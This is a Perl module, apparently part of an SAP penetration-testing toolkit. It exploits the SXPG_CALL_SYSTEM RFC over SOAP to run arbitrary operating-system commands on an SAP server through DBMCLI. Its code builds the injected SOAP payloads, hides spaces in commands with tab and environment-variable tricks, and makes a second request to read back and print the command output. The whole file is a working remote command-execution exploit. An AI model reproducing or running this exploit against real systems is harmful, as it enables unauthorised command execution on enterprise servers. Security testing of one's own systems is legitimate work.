#!/usr/bin/perl
# Module Command execution (SXPG_COMMAND_EXECUTE+)
# Based on Agnivesh Sathasivam & nmonkee's module 

# CONFIG
######################
my $desc ="Command execution (SXPG_COMMAND_SYSTEM via DBMCLI) \n\t Usage: black.pl .. .. $argv[5] <OS_type> [command]\n\t  <OS_type> - SAP's OS: windows or unix(!untested!)\n\t [command] - command to execute, default is SET\n"; 
our $funcName="sxpg_command_system_dbmcli_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub sxpg_command_system_dbmcli_Func()
{

	my $XML='<?xml version="1.0" encoding="utf-8" ?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	<SOAP-ENV:Body>
		<m:SXPG_CALL_SYSTEM xmlns:m="urn:sap-com:document:sap:rfc:functions">
			<ADDITIONAL_PARAMETERS></ADDITIONAL_PARAMETERS>
			<COMMANDNAME>DBMCLI</COMMANDNAME>
			<EXEC_PROTOCOL>
				<item>
				</item>
			</EXEC_PROTOCOL>
				</m:SXPG_CALL_SYSTEM>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>';
	
	if ($ARGV[$m_arg_i+2]){
		$cmd=$ARGV[$m_arg_i+2];
	
	} else {
		$cmd='set';
	}
	print $cmd." - cmd\n";

	
	if ($ARGV[$m_arg_i+1]=~'unix'){
		$cmd=~s|\s+|\t|g;
		$XML=~s|<ADDITIONAL_PARAMETERS>|<ADDITIONAL_PARAMETERS>-o /tmp/test.txt -n zzz\n!$cmd\n|s;
		
	} elsif ($ARGV[$m_arg_i+1]=~'windows'){
		#$XML=~s|<ADDITIONAL_PARAMETERS>|<ADDITIONAL_PARAMETERS>-o c:\\test.txt -n zzz\r\n!|s;
		$cmd=~s|\s+|%programfiles:~10,1%|g;
		#$cmd=$cmd."";
		$XML=~s|<ADDITIONAL_PARAMETERS>|<ADDITIONAL_PARAMETERS>-o c:\\Windows\\Temp\\test.txt -n zzz\r\n!$cmd\r\n|s;
	}
	else{
		print "Please, choose OS type";
		exit;
	}
			
	print $ARGV[$m_arg_i+1]." - OS \n\n\n";
	#print "$XML\r\n";
	
	print "Sending first SOAP RFC packet...\r\n";
	
	my @answers=send_soap($XML,1);

	my $answer=join('', @answers);
	
	print "Server reply:\r\n";
	
	print "$answer\r\n";
	
	print "\n\n";
	
	print "Sending second SOAP RFC packet...\r\n";
	print "Parsed server reply:\r\n";
	
	 $XML='<?xml version="1.0" encoding="utf-8" ?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	 <SOAP-ENV:Body>
		 <m:SXPG_CALL_SYSTEM xmlns:m="urn:sap-com:document:sap:rfc:functions">
			 <ADDITIONAL_PARAMETERS>-ic c:\\Windows\\Temp\\test.txt </ADDITIONAL_PARAMETERS>
			 <COMMANDNAME>DBMCLI</COMMANDNAME>
			 <EXEC_PROTOCOL>
				 <item>
				 </item>
			 </EXEC_PROTOCOL>
				 </m:SXPG_CALL_SYSTEM>
	 </SOAP-ENV:Body>
 </SOAP-ENV:Envelope>';
	
	my @answers=send_soap($XML,1,'/sap/bc/soap/rfc','POST',2);
	my $answer=join('', @answers);
	
	if ($answer=~m/<faultstring>(.*)<\/faultstring>/i){
		print "Error! \"$1\" \n";		
		}
	
	#my @messages = $answer =~ /<message>([\w\/\\:;=]+)<\/message>/gi;
	
	@messages= split(/<message>/i,$answer);
	
	 foreach $mess(@messages){
		$gmess = substr($mess, 0, index($mess, '</MESSAGE>'));
		if ($gmess=~'---'){next;}
		if ($gmess=~/^err/i){next;}
		if ($gmess=~/^<\?xml/i){next;}
		print "$gmess \n";		
		}

		
	#print "ice! \"$messages[1]\" \n";		
	#print "$answer\r\n";
	
	print "\n\n";

}